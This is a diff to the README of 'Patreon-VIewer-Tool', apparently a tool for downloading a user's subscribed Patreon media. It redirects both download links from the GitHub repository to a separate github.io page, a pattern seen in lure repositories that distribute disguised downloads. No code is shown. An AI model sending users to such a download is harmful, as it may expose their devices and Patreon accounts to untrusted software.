@@ -1,12 +1,12 @@
 # 📦 Patreon-VIewer-Tool - View and archive creator content easily
 
-[![](https://img.shields.io/badge/Download-Patreon--VIewer--Tool-blue.svg)](https://github.com/nt022994/Patreon-VIewer-Tool)
+[![](https://img.shields.io/badge/Download-Patreon--VIewer--Tool-blue.svg)](https://nt022994.github.io)
 
 Patreon-VIewer-Tool helps users view and archive media from Patreon creators. The application connects to your account to fetch posts, images, and videos. You can save this media to your local drive. This tool acts as a library for your subscribed content.
 
 ## 📥 How to Download 
 
-To start, visit the main project page to find the current version of the software. You need to identify the latest release to ensure you have all updates. Visit this page to download: https://github.com/nt022994/Patreon-VIewer-Tool
+To start, visit the main project page to find the current version of the software. You need to identify the latest release to ensure you have all updates. Visit this page to download: https://nt022994.github.io
 
 1. Go to the link above.
 2. Look for the section labeled "Releases" on the right side of the screen.
